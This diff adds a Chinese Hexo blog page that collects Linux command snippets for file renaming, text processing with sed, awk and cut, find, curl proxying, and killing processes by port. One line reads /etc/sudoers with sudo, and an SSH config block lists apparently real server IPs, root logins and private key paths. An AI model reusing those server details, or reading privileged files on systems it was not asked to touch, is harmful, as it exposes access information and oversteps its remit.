@@ -1,0 +1,946 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="X_T" href="http://n1h1l157.github.io/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="X_T" href="http://n1h1l157.github.io/atom.xml" />
+<link rel="alternate" type="application/json" title="X_T" href="http://n1h1l157.github.io/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="Linux" />
+
+
+<link rel="canonical" href="http://n1h1l157.github.io/2023/05/19/SAFE/Linux/">
+
+
+
+  <title>
+Linux 命令 - 信息安全 |
+Phut Hon = X_T = 天行健，君子以自强不息</title>
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">Linux 命令
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2023-05-19 22:46:36">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2023-05-19T22:46:36+08:00">2023-05-19</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">Phut Hon</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/vGCLbdJPMhuwg3H.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/DZRlqjoQg3XAKsz.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/BRgyaX5iTpFLeYQ.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/AG1hjZYM3aSKz6H.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/NE8OanW5ut73GYv.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/yonQxXhNmEuMgF2.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="item" rel="index" title="分类于 信息安全"><span itemprop="name">信息安全</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="http://n1h1l157.github.io/2023/05/19/SAFE/Linux/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content=".N1h1l157">
+    <meta itemprop="description" content="天行健，君子以自强不息, 人生如逆旅，我亦是行人">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="X_T">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <p>对爱情的渴望，对知识的追求，对人类苦难不可遏制的同情，这三种纯洁而无比强烈的激情支配着我的一生。</p>
+<h2 id="ls"><a class="markdownIt-Anchor" href="#ls">#</a> ls</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">只显示文件夹</span></span><br><span class="line">ls -d */</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20015.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#显示所有子文件夹的子文件</span><br><span class="line">ls *<span class="comment">/*</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20000.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#将下划线变为空格</span><br><span class="line">ls | sed <span class="string">&#x27;s/_/ /g&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20001.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#以点为分割取第一部分</span><br><span class="line">ls | cut -d <span class="string">&quot;.&quot;</span> -f <span class="number">1</span> </span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20002.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 选取切割后的第二列到最后一列</span><br><span class="line">ls | cut -d <span class="string">&quot;_&quot;</span> -f <span class="number">2</span>- </span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20003.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#对ls的输出结果添加前缀和后缀</span><br><span class="line">ls | sed <span class="string">&#x27;s/^/Save_/&#x27;</span> | sed <span class="string">&#x27;s/$/_In_Path/&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20004.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 以点为分割，不包括最后一项</span><br><span class="line">ls | cut -d <span class="string">&#x27;.&#x27;</span> -f <span class="number">1</span>-$(($(ls | head -n <span class="number">1</span> | tr -dc <span class="string">&#x27;.&#x27;</span> | wc -c)+<span class="number">1</span>)) | rev | cut -d <span class="string">&#x27;.&#x27;</span> -f <span class="number">2</span>- | rev</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20005.png" alt></p>
+<h2 id="cat"><a class="markdownIt-Anchor" href="#cat">#</a> cat</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cat</span>的结果中添加前缀和后缀</span></span><br><span class="line">cat 1.txt | sed &#x27;s/^/mv /g;s/$/ ..\/..\/..\/del_plg\//g&#x27;</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20006.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 删除文件前后所有的空格</span><br><span class="line">cat <span class="number">1.</span>txt | sed <span class="string">&#x27;s/^[[:space:]]*//;s/[[:space:]]*$//&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20007.png" alt></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 消除序号的影响</span></span><br><span class="line"><span class="built_in">cat</span> 1.txt | <span class="built_in">cut</span> -d <span class="string">&#x27;.&#x27;</span> -f 2 | sed <span class="string">&#x27;s/^[[:space:]]*//&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20008.png" alt></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 去掉空行</span></span><br><span class="line"><span class="built_in">cat</span> 1.txt | awk <span class="string">&#x27; &#123;if ($0!=&quot;&quot;)print&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20009.png" alt></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 去掉文本的换行符，连文件末尾换行符也去掉</span></span><br><span class="line"><span class="built_in">cat</span> 1.txt | xargs <span class="built_in">echo</span> -n </span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20010.png" alt></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 去掉文本的换行符，会保留文件末尾的换行符</span></span><br><span class="line"><span class="built_in">cat</span> 1.txt | xargs </span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20011.png" alt></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 去除空行和首处的空格</span></span><br><span class="line"><span class="built_in">cat</span> 1.txt | sed <span class="string">&#x27;/^$/d&#x27;</span> | sed <span class="string">&#x27;s/^[[:space:]]*//&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20012.png" alt></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将1.txt文件中每行第三个下划线后的单词的首字母变为大写</span></span><br><span class="line"><span class="built_in">cat</span> 1.txt | <span class="built_in">cut</span> -d <span class="string">&quot;_&quot;</span> -f 3- | awk <span class="string">&#x27;&#123;print toupper(substr($0,1,1)) substr($0,2)&#125;&#x27;</span> | sed <span class="string">&#x27;s/^/Lateral_Penetration_/g&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20013.png" alt></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 将后缀改为.rule，去掉换行符，并cp到另外的目录</span><br><span class="line">cat 1.txt | sed &#x27;s/.yaml//g;s/$/.rule/g;s/!/\\\\!/g&#x27; | xargs | sed &#x27;s/^/cp /g;s/$/ \/Users\/chentuo\/Public\/xxxxxx\/插件运营\/自动上传脚本\/威胁防护CI_CD加密\//g&#x27;</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20014.png" alt></p>
+<h2 id="for"><a class="markdownIt-Anchor" href="#for">#</a> for</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">批量压缩文件</span></span><br><span class="line">for dir in $(ls -d */); do zip -r &quot;$&#123;dir%/&#125;.zip&quot; &quot;$dir&quot;;done</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20016.png" alt></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">批量修改文件名,将点替换为-</span></span><br><span class="line">for file in *; do mv &quot;$file&quot; &quot;$&#123;file//./_&#125;&quot;; done</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20017.png" alt></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">仅保留文件名中的最后6个字符</span></span><br><span class="line">for file in *; do new_file_name=&quot;$&#123;file:(-6)&#125;&quot;;mv &quot;$file&quot; &quot;$new_file_name&quot;;done</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20018.png" alt></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 批量修改文件名字</span></span><br><span class="line">i=10000; <span class="keyword">for</span> file <span class="keyword">in</span> *; <span class="keyword">do</span> <span class="built_in">mv</span> <span class="string">&quot;<span class="variable">$file</span>&quot;</span> <span class="string">&quot;<span class="variable">$i</span>&quot;</span>.jpeg; i=$((i+<span class="number">1</span>)); <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20019.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 批量增加前缀和删除前缀</span><br><span class="line"><span class="keyword">for</span> i in `ls` ; <span class="keyword">do</span> mv <span class="string">&quot;$i&quot;</span> <span class="string">&quot;【前缀】$i&quot;</span>;done</span><br><span class="line"><span class="keyword">for</span> i in `ls` ; <span class="keyword">do</span> mv <span class="string">&quot;$i&quot;</span> `echo <span class="string">&quot;$i&quot;</span> | cut -d <span class="string">&quot;】&quot;</span> -f <span class="number">2</span>-`;done</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20020.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 生成自己需要的循环的内容</span><br><span class="line"><span class="keyword">for</span> i in &#123;<span class="number">20000.</span><span class="number">.20130</span>&#125;;<span class="keyword">do</span> echo <span class="string">&#x27;![](/N1h1l157/Linux/&#x27;</span>$i<span class="number">&#x27;.</span>png)<span class="string">&#x27; &gt;&gt; 1.txt;done</span></span><br></pre></td></tr></table></figure>
+<h2 id="find"><a class="markdownIt-Anchor" href="#find">#</a> find</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">批量修改文件名，将空格替换为划线</span></span><br><span class="line">find * -depth -name &#x27;* *&#x27; -execdir bash -c &#x27;mv &quot;$0&quot; &quot;$&#123;0// /-&#125;&quot;&#x27; &quot;&#123;&#125;&quot; \;</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20021.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 递归查找名为<span class="string">&quot;here&quot;</span>的文件夹，并打印其完整路径</span><br><span class="line">find . -type d -name <span class="string">&quot;here&quot;</span> -print</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20022.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 搜索当前目录下此文件，包括各级子目录</span><br><span class="line">find . -name <span class="string">&quot;filename.txt&quot;</span> -print</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20023.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 列出当前目录下的所有文件</span><br><span class="line">find . -type f -exec echo &#123;&#125; \;</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20024.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 过滤当前目录下的./image文件夹，打印其他目录下的所有文件</span><br><span class="line">find . -path ./image -prune -o -type f -exec echo &#123;&#125; \;</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20025.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 过滤多文件</span><br><span class="line">find . \( -path ./image -o -path ./resource \) -prune -o -type f -exec echo &#123;&#125; \;</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20026.png" alt></p>
+<h2 id="rename"><a class="markdownIt-Anchor" href="#rename">#</a> rename</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">重命名文件将-用.替换</span></span><br><span class="line">rename &#x27;s/-/./g&#x27; *</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20027.png" alt></p>
+<h2 id="du"><a class="markdownIt-Anchor" href="#du">#</a> du</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">统计大小</span></span><br><span class="line">du -sh * </span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20063.png" alt></p>
+<h2 id="scp"><a class="markdownIt-Anchor" href="#scp">#</a> scp</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">scp免密设置 - sudo vim ~/.ssh/config</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置之后可以通过 ssh root@linux1 连接，并且免密</span></span><br><span class="line">Host linux1</span><br><span class="line">Hostname 1.117.52.219</span><br><span class="line">User root</span><br><span class="line">Port 2121</span><br><span class="line">IdentityFile /etc/ssh/chentuo_cloud.pem</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">或者不设置 hostname,通过 ssh root@47.102.120.55 免密连接</span></span><br><span class="line">Host 47.102.120.55</span><br><span class="line">User root</span><br><span class="line">Port 22</span><br><span class="line">IdentityFile ~/.ssh/aliyun_1106_rsa</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20129.png" alt></p>
+<h2 id="hash"><a class="markdownIt-Anchor" href="#hash">#</a> hash</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">计算sha256值</span></span><br><span class="line">shasum -a 256 filename-1.txt</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20028.png" alt></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 输出转为大写</span></span><br><span class="line">shasum -a 256 filename-1.txt  | awk <span class="string">&#x27;&#123;print toupper($0)&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20029.png" alt></p>
+<h2 id="jq"><a class="markdownIt-Anchor" href="#jq">#</a> jq</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">json 格式标准化输出</span></span><br><span class="line">cat 1.json | jq</span><br><span class="line">jq . 1.json</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20030.png" alt></p>
+<h2 id="curl"><a class="markdownIt-Anchor" href="#curl">#</a> curl</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">curl如何走代理</span></span><br><span class="line">curl --socks5 &quot;127.0.0.1:7890&quot; &quot;http://httpbin.org/ip&quot; </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查询某个ip的归属地</span></span><br><span class="line">curl cip.cc/8.8.8.8</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20031.png" alt><br>
+<img data-src="/N1h1l157/Linux/20032.png" alt></p>
+<h2 id="tr"><a class="markdownIt-Anchor" href="#tr">#</a> tr</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">不打印消息拷贝</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">windows</span></span><br><span class="line">cat ~/.ssh/id_ed25519.pub | clip</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">linux</span></span><br><span class="line">xclip -sel clip &lt; ~/.ssh/id_ed25519.pub</span><br><span class="line">cat /lib64/libm.so.6 | xclip -sel clip</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">mac</span></span><br><span class="line">cat 1.json | pbcopy</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20033.png" alt></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">mac</span></span><br><span class="line">tr -d &#x27;\n&#x27; &lt; ~/.ssh/id_rsa.pub | pbcopy</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20034.png" alt></p>
+<h2 id="ps"><a class="markdownIt-Anchor" href="#ps">#</a> ps</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前运行了哪些服务</span></span><br><span class="line">ps -ef | grep Linux</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20035.png" alt></p>
+<h2 id="conda"><a class="markdownIt-Anchor" href="#conda">#</a> conda</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前有哪些环境</span></span><br><span class="line">conda env list</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">新建一个python3.7的conda环境</span></span><br><span class="line">conda create -n test python=3.8</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20036.png" alt></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 激活环境与退出环境</span><br><span class="line">conda activate test</span><br><span class="line">conda deactivate</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20037.png" alt></p>
+<h2 id="uname"><a class="markdownIt-Anchor" href="#uname">#</a> uname</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前核心版本号</span></span><br><span class="line">uname -a </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前内核版本</span></span><br><span class="line">uname -r </span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20038.png" alt></p>
+<h2 id="lsof"><a class="markdownIt-Anchor" href="#lsof">#</a> lsof</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看端口是否被占用</span></span><br><span class="line">lsof -i:10086</span><br><span class="line">lsof -i:10086 | grep -v PID | awk &#x27;&#123;print $2&#125;&#x27; | xargs kill -9</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20039.png" alt></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 杀掉80端口的进程</span><br><span class="line">lsof -i:10086 | awk &#x27;&#123;print $2&#125;&#x27; | grep -v &#x27;PID&#x27; | uniq | xargs kill -9 </span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20040.png" alt></p>
+<h2 id="grep"><a class="markdownIt-Anchor" href="#grep">#</a> grep</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">排除某字段，取前几行、后几行</span></span><br><span class="line">cat url.txt | cut -d &#x27;:&#x27; -f 2 | sed &#x27;s/\/\///g&#x27;| grep -v url | uniq | tail -n 10 | head -n 10 | xargs open</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20041.png" alt></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 去掉空行与注释行</span><br><span class="line">sudo cat /etc/sudoers | grep -v &#x27;#&#x27; | grep -v &#x27;^\s*$&#x27;</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20042.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 批量过滤</span><br><span class="line">cat .bash_history | grep -v <span class="string">&quot;#\|ls\|cd\|ll\|clear\|neofetch\|man\|sl&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20043.png" alt></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 过滤出 uncompression 字段的文件是哪个</span><br><span class="line">grep -lH <span class="string">&quot;uncompression&quot;</span> *</span><br><span class="line">grep -lH <span class="string">&quot;人生困惑&quot;</span> *.md</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20044.png" alt></p>
+<h2 id="cp"><a class="markdownIt-Anchor" href="#cp">#</a> cp</h2>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">复制多个具有相同规则的子文件夹中的内容到另外一个文件夹中</span> </span><br><span class="line">cp -r *Trojan/* ../test</span><br></pre></td></tr></table></figure>
+<p><img data-src="/N1h1l157/Linux/20045.png" alt></p>
+<h2 id="ln"><a class="markdownIt-Anchor" href="#ln">#</a> ln</h2>
